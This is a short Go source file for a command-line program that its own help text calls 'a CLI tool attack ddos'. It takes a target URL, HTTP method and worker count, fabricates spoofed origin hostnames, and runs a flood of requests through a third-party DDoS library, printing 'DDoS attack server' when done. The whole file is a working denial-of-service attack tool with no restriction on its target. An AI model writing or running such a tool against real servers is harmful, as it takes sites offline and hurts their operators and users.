package main

import (
	"fmt"
	"os"

	"github.com/rafael180496/test-ddos/ddos"
	"github.com/spf13/cobra"
)

func main() {
	var method string
	var url string
	var workers int

	var rootCmd = &cobra.Command{
		Use:   "myfetchapp",
		Short: "My fetch App is a CLI tool attack ddos",
		Long:  `My fetch App is a CLI tool attack ddos`,
	}
	var fetchCmd = &cobra.Command{
		Use:   "fetch",
		Short: "Fetch URL with specified method and number of workers",
		Long:  `Fetches the content of the specified URL using the specified HTTP method and number of workers.`,
		Args:  cobra.ExactArgs(0),
		Run: func(cmd *cobra.Command, args []string) {
			var origins = []string{}
			for i := 0; i < workers; i++ {
				origins = append(origins, fmt.Sprintf("http://example%v.com", i))
			}
			d, err := ddos.New(url, workers, method, "", origins)
			if err != nil {
				panic(err)
			}
			d.Run()
			d.Result()
			fmt.Printf("\nDDoS attack server:%s", url)
			// Output: DDoS attack server: http://127.0.0.1:80
		},
	}
	fetchCmd.Flags().StringVarP(&method, "method", "m", "GET", "HTTP method to use default GET")
	fetchCmd.Flags().StringVarP(&url, "url", "u", "", "URL to fetch")
	fetchCmd.Flags().IntVarP(&workers, "workers", "w", 10, "Number of workers to use default 10")

	fetchCmd.MarkFlagRequired("url")
	rootCmd.AddCommand(fetchCmd)
	if err := rootCmd.Execute(); err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
}
